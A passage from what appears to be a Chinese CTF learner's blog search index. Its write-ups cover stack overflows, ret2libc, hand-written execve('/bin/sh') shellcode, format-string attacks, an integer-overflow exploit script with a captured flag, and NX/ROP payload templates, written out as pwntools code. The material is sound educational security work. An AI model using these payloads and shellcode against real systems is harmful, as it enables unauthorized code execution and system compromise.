libc.dump(&#x27;system&#x27;)<br>binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br><br>payload2 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(binsh) + p64(sys)<br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>接收返回的got地址时，使用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br># or<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvline</span>()<span class="hljs-selector-class">.strip</span>()<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br></code></pre></td></tr></table></figure><p>是正确的<br>这样可以正确地补上两位\x00<br>而其他方法，保留\n的都是错误的，会导致地址错误！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2022/05/28/shellcode/"/>
    <url>/2022/05/28/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode的利用"><a href="#shellcode的利用" class="headerlink" title="shellcode的利用"></a>shellcode的利用</h1><p>以国赛提前一天放出的模拟题为例<br>本文基于32位系统<br>打开题目后可以发现一下基础信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">没有开任何防护<br>没有开NX保护，意味着第一时间可以想到，把<span class="hljs-keyword">shellcode放在栈上运行</span><br><span class="hljs-keyword"></span>是<span class="hljs-number">32</span>位程序<br></code></pre></td></tr></table></figure><h2 id="shellcode-生成方法"><a href="#shellcode-生成方法" class="headerlink" title="shellcode 生成方法"></a>shellcode 生成方法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)</span></span><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())<br></code></pre></td></tr></table></figure><p>这样就可以生成一个shellcode<br><strong>注意：这样生成的shellcode长度为44，如果超过可以收容的大小，可能需要用其他方法编写shellcode</strong><br>以下为手动生成shellcode方法，大小为23，很小。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>             #<span class="hljs-built_in">eax</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>#<span class="hljs-built_in">edx</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>#将<span class="hljs-number">0</span>入栈，标记了”/bin/sh”的结尾<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x68732f2f</span>         #传递”/sh”，为了<span class="hljs-number">4</span>字节对齐，使用//sh，这在execve()中等同于/sh<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x6e69622f</span>         #传递“/bin”<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span>             #此时<span class="hljs-built_in">esp</span>指向了”/bin/sh”,通过<span class="hljs-built_in">esp</span>将该字符串的值传递给<span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xB</span>              #<span class="hljs-built_in">eax</span>置为execve函数的中断号<br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>                #调用软中断<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm（shellcode）<br></code></pre></td></tr></table></figure><p>关于int 0x80软中断</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">第一步，就是需要将系统调用号加入到<span class="hljs-built_in">eax</span>中。<br>第二步，<span class="hljs-built_in">ebx</span>保存函数调用的第一个参数，<span class="hljs-built_in">ecx</span>、<span class="hljs-built_in">edx</span>、<span class="hljs-built_in">esi</span>、<span class="hljs-built_in">edi</span>分别对应这<span class="hljs-number">2345</span>个参数。<br>如果参数超过<span class="hljs-number">5</span>个，就必须将参数数组存储在内存中，而且必须将该数组的地址放在<span class="hljs-built_in">ebx</span>中。<br>一旦加载寄存器后，就会调用<span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> 汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。<br></code></pre></td></tr></table></figure><h2 id="用ROPgadget获取jmp-esp地址"><a href="#用ROPgadget获取jmp-esp地址" class="headerlink" title="用ROPgadget获取jmp esp地址"></a>用ROPgadget获取jmp esp地址</h2><p>目的在于将返回值设置为jmp esp，可以返回esp然后执行传入的shellcode。</p><h2 id="最终的payload"><a href="#最终的payload" class="headerlink" title="最终的payload"></a>最终的payload</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">payload = shellcode.ljust(<span class="hljs-number">0x80</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(addr_jmp_esp) + asm(<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">esp</span>,<span class="hljs-title">offset</span></span>;call esp)<br><span class="hljs-comment">#关于这个asm(...),是手动启用栈，offset值为前面覆盖的数据长度+4。</span><br></code></pre></td></tr></table></figure><p>如此就可以利用一个没有保护，但是也没有system()的程序。<br><strong>注意shellcode在发送时不用p32包装！！</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国赛</title>
    <link href="/2022/05/23/%E5%9B%BD%E8%B5%9B/"/>
    <url>/2022/05/23/%E5%9B%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-格式化字符串漏洞"><a href="#0x01-格式化字符串漏洞" class="headerlink" title="0x01 格式化字符串漏洞"></a>0x01 格式化字符串漏洞</h1><h2 id="漏洞的产生原因及利用原理"><a href="#漏洞的产生原因及利用原理" class="headerlink" title="漏洞的产生原因及利用原理"></a>漏洞的产生原因及利用原理</h2><p>我们在正常的对格式化字符输出时大都使用printf(*format,*arg);<br>此种形式进行输出，但是部分程序员在开发的使用，为了省事使用了，printf(*format);进行输出<br>错误：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s);<br>}</p><p>正确：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s,str);<br>}</p><p>出现字符串格式化漏洞时，有如下方法</p><h3 id="任意地址泄露（读）"><a href="#任意地址泄露（读）" class="headerlink" title="任意地址泄露（读）"></a>任意地址泄露（读）</h3><p>任意地址读需要用到printf的另外一个特性,$操作符.这个操作符可以输出指定位置的参数.利用%n$x这样的字符串就可以获得对应的第n+1个参数的数值(因为格式化参数里边的n指的是格式化字符串对应的第n个输出参数,那么相对于输出函数来说就成了第n+1个).<br>先输入若干个数据确定偏移，比如AAAA%6$x，若输出为AAAA41414141时，就是达到了偏移量，此时偏移为6，若改为AAAA%7$x，脚本写为</p><blockquote></blockquote><p>conn.sendline(“%7$s”+p32(0x08048000))</p><p>会打印处0x0804800地址前几字段。<br>原因如下：此脚本中将p32(0x08048000)率先压入栈中，当其格式化串超出偏移值1个位置时，会读取栈上此地址，然后进行打印，看如下栈图。<br><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p1.jpg"></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>利用%n的特性，可以将已打印字符数传给后续传入的地址<br>如：<br>printf(“%.100d%n”,c,&amp;c);<br>可以打印100个c，然后将100赋值到c的地址处。</p><p>总结一下<br>payload核心在于，先计算出偏移值，再利用%kc%m$n进行修改</p><h3 id="攻防世界题-string（新手区）"><a href="#攻防世界题-string（新手区）" class="headerlink" title="攻防世界题 string（新手区）"></a>攻防世界题 string（新手区）</h3><p>此题有几点需要注意，首先是这个样子的代码，是可以考虑传入shellcode直接执行</p><blockquote><p>((void (__fastcall*)(_QWORD))v1)(0LL)</p></blockquote><p>此行会将v1转化为代码执行，使用</p><figure class="highlight moonscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>, <span class="hljs-built_in">os</span> = <span class="hljs-string">&#x27;linux&#x27;</span><br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>得到shellcode机器码。</p><p>再者就是灵活运用printf(format)这样的漏洞<br>如本题中，需要泄露v3的地址，且此地址就在漏洞printf不远处，就不要用AAAA-%p….的形式去泄露AAAA所存储的地址了，而是直接找v3对应内存的值，在输入%p….后对应偏移量为多少</p><h3 id="记录一个新方法"><a href="#记录一个新方法" class="headerlink" title="记录一个新方法"></a>记录一个新方法</h3><p>修改地址法<br>用到pwn里的fmtstr_payload(offset,{被替换的：替换为})<br>这个语法<br>如将atoi的got地址改为system的plt地址，可以写为<br>payload = fmtstr_payload(offset,{atoi_got : system_plt})即可利用格式化字符串修改地址</p><h1 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h1><h2 id="寄存器传参顺序"><a href="#寄存器传参顺序" class="headerlink" title="寄存器传参顺序"></a>寄存器传参顺序</h2><p>64位系统中，函数传参进入寄存器<br>而32位是先入栈再传入数据。<br>64位的传参顺序：前7个参数，从左至右依次传入rdi，rsi，rdx，rcx，r8，r9，r15.</p><h2 id="简单ROP"><a href="#简单ROP" class="headerlink" title="简单ROP"></a>简单ROP</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>若题目没给libc版本，需要用LibcSearch来做，其中格式为libc.dump(‘system’)<br>如果给了libc版本，可以这样<br>libc = ELF(‘./libc-2.xx.so’)这样子<br>搜索/bin/sh字符串所在位置时，有如下语法：<br>next(libc.search(b’/bin/sh’))可以获取binsh的地址</p><h3 id="关于strlen-检测的绕过"><a href="#关于strlen-检测的绕过" class="headerlink" title="关于strlen()检测的绕过"></a>关于strlen()检测的绕过</h3><p>read函数读至’\n’结束<br>strlen读至’\x00’结束<br>在32位里面，char数组读入时：read(0,buf,10u)，就读入十个char，而’\x00’是一个char<br>故遇到检查strlen来进行阻碍时，可以在字符串前面输入’\x00’开头，来规避之。</p><h3 id="关于构造好ROP以后，接收got表地址时的注意事项"><a href="#关于构造好ROP以后，接收got表地址时的注意事项" class="headerlink" title="关于构造好ROP以后，接收got表地址时的注意事项"></a>关于构造好ROP以后，接收got表地址时的注意事项</h3><p>1.32位系统下，got表地址是4byte，用p.recv(4);u32(write)来收取<br>2.64位系统下，got表地址位8byte，需要进行相当的调整。</p><h1 id="0x03-堆heap"><a href="#0x03-堆heap" class="headerlink" title="0x03 堆heap"></a>0x03 堆heap</h1><p>引用经典内存布局</p><p><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
